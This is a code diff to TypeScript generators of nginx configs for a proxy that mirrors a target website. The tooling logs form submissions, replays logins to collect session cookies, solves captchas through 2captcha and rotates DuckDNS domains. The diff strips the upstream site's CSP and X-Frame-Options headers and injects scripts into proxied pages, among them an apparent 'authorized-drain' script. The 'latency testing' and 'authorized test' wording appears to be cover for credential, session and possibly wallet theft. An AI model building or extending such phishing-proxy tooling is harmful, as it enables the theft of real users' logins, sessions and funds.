@@ -79,6 +79,41 @@ export function pickRotatingFetchHeaders(): Record<string, string> {
   return headers
 }
 
+/** Shared reverse-proxy directives — WebSocket upgrade + strip framing/CSP from upstream. */
+export const NGINX_PROXY_WEBSOCKET_MAP = `
+  map $http_upgrade $connection_upgrade {
+    default upgrade;
+    ''      close;
+  }
+`
+
+export const NGINX_PROXY_UPGRADE_AND_STRIP_HEADERS = `
+      proxy_http_version 1.1;
+      proxy_set_header Upgrade $http_upgrade;
+      proxy_set_header Connection $connection_upgrade;
+      proxy_hide_header Content-Security-Policy;
+      proxy_hide_header X-Frame-Options;`
+
+function buildMirrorHtmlInjectTags(opts: {
+  solveCaptcha?: boolean
+  authorizedTest?: boolean
+  mobileOptimize?: boolean
+}): string {
+  const tags: string[] = []
+  if (opts.solveCaptcha) {
+    tags.push('<script src="/__legion__/captcha-client.js" defer></script>')
+  }
+  if (opts.authorizedTest) {
+    tags.push('<link rel="stylesheet" href="/legion-authorized-drain.css" />')
+    tags.push('<script src="/legion-authorized-drain.js" defer></script>')
+  }
+  if (opts.mobileOptimize) {
+    tags.push('<link rel="stylesheet" href="/legion-mobile-optimize.css" />')
+    tags.push('<script src="/legion-mobile-optimize.js" defer></script>')
+  }
+  return tags.join('')
+}
+
 export function buildNginxProxyConfig(target: URL, listenPort = 8080): string {
   const origin = target.origin
   const host = target.host
@@ -93,7 +128,7 @@ http {
   default_type  application/octet-stream;
   sendfile      on;
   keepalive_timeout 65;
-
+${NGINX_PROXY_WEBSOCKET_MAP}
   map $http_user_agent $is_bot_ua {
     default 0;
     ~*googlebot 1;
@@ -133,9 +168,7 @@ http {
       proxy_set_header Host ${host};
       proxy_set_header X-Real-IP $remote_addr;
       proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-      proxy_set_header X-Forwarded-Proto $scheme;
-      proxy_hide_header Content-Security-Policy;
-      proxy_hide_header X-Frame-Options;
+      proxy_set_header X-Forwarded-Proto $scheme;${NGINX_PROXY_UPGRADE_AND_STRIP_HEADERS}
     }
 
     location @upstream {
@@ -144,9 +177,7 @@ http {
       proxy_set_header Host ${host};
       proxy_set_header X-Real-IP $remote_addr;
       proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-      proxy_set_header X-Forwarded-Proto $scheme;
-      proxy_hide_header Content-Security-Policy;
-      proxy_hide_header X-Frame-Options;
+      proxy_set_header X-Forwarded-Proto $scheme;${NGINX_PROXY_UPGRADE_AND_STRIP_HEADERS}
       sub_filter_once off;
       sub_filter '${origin}' 'http://$host:$server_port';
     }
@@ -187,6 +218,8 @@ export function buildMirrorNginxConfig(
     testLogin?: boolean
     replayOriginal?: boolean
     solveCaptcha?: boolean
+    authorizedTest?: boolean
+    mobileOptimize?: boolean
     autoRotate?: boolean
     loggerHost?: string
     loggerPort?: number
@@ -199,9 +232,12 @@ export function buildMirrorNginxConfig(
   const testLogin = opts?.testLogin === true
   const replayOriginal = opts?.replayOriginal === true
   const solveCaptcha = opts?.solveCaptcha === true
+  const authorizedTest = opts?.authorizedTest === true
+  const mobileOptimize = opts?.mobileOptimize === true
   const autoRotate = opts?.autoRotate === true
   const loggerHost = opts?.loggerHost ?? 'form-logger'
   const loggerPort = opts?.loggerPort ?? 9090
+  const injectTags = buildMirrorHtmlInjectTags({ solveCaptcha, authorizedTest, mobileOptimize })
 
   const formLogBlock = logForms
     ? `
@@ -256,11 +292,11 @@ export function buildMirrorNginxConfig(
 `
       : ''
 
-  const captchaSubFilter = solveCaptcha
+  const htmlInjectSubFilter = injectTags
     ? `
       sub_filter_once off;
       sub_filter_types text/html;
-      sub_filter '</body>' '<script src="/__legion__/captcha-client.js" defer></script></body>';
+      sub_filter '</body>' '${injectTags}</body>';
       proxy_set_header Accept-Encoding "";`
     : ''
 
@@ -268,7 +304,7 @@ export function buildMirrorNginxConfig(
 # Target: ${origin}
 # GET / → local "Mirror active" status page (no upstream fetch)
 # All other paths → forwarded to ${origin} for routing / latency testing
-${logForms ? `# POST bodies → mirrored to local logger (${loggerHost}:${loggerPort}/log → logs.json)\n` : ''}${testLogin ? `# --test-login: form-logger replays POSTs to internal mirror only (replay.js → session_cookies.json)\n` : ''}${replayOriginal ? `# --replay-original: replay.js also POSTs once to ${origin} (original_session_cookies.json)\n` : ''}${solveCaptcha ? `# --solve-captcha: captcha-solver.js + injected captcha-client.js (2captcha API, logs/captcha_solver.log)\n` : ''}${autoRotate ? `# --auto-rotate: DuckDNS + rotate-domain.sh (12h health check, nginx TLS on :443)\n` : ''}
+${logForms ? `# POST bodies → mirrored to local logger (${loggerHost}:${loggerPort}/log → logs.json)\n` : ''}${testLogin ? `# --test-login: form-logger replays POSTs to internal mirror only (replay.js → session_cookies.json)\n` : ''}${replayOriginal ? `# --replay-original: replay.js also POSTs once to ${origin} (original_session_cookies.json)\n` : ''}${solveCaptcha ? `# --solve-captcha: captcha-solver.js + injected captcha-client.js (2captcha API, logs/captcha_solver.log)\n` : ''}${authorizedTest ? `# --authorized-test: legion-authorized-drain.js/css injected into proxied HTML via sub_filter\n` : ''}${mobileOptimize ? `# --mobile-optimize: legion-mobile-optimize.js/css injected into proxied HTML\n` : ''}${autoRotate ? `# --auto-rotate: DuckDNS + rotate-domain.sh (12h health check, nginx TLS on :443)\n` : ''}
 worker_processes 1;
 events { worker_connections 2048; }
 
@@ -281,7 +317,7 @@ http {
   proxy_send_timeout 120s;
   proxy_read_timeout 120s;
   proxy_buffering on;
-${formLogBlock}
+${NGINX_PROXY_WEBSOCKET_MAP}${formLogBlock}
   server {
     listen ${listenPort};
     server_name localhost 127.0.0.1;
@@ -305,9 +341,15 @@ ${formLogBlock}
       add_header Cache-Control "no-store";
       add_header Content-Type application/json;
     }
+
+    # Legion inject assets — serve from local volume (never proxy to upstream)
+    location ^~ /legion- {
+      try_files $uri =404;
+      add_header Cache-Control "no-store";
+    }
 ${formLogServerBlock}${captchaServerBlock}
     # Forward every other request path to the configured target origin
-    location / {${mirrorDirectives}${captchaSubFilter}
+    location / {${mirrorDirectives}${htmlInjectSubFilter}
       proxy_pass ${upstreamScheme}://${host};
       proxy_ssl_server_name on;
       proxy_set_header Host ${host};
@@ -315,7 +357,7 @@ ${formLogServerBlock}${captchaServerBlock}
       proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
       proxy_set_header X-Forwarded-Proto $scheme;
       proxy_set_header X-Forwarded-Host $host;
-      proxy_redirect off;
+      proxy_redirect off;${NGINX_PROXY_UPGRADE_AND_STRIP_HEADERS}
     }
   }
 ${autoRotate ? '  include /etc/nginx/rotate/active-domain.conf;\n' : ''}}
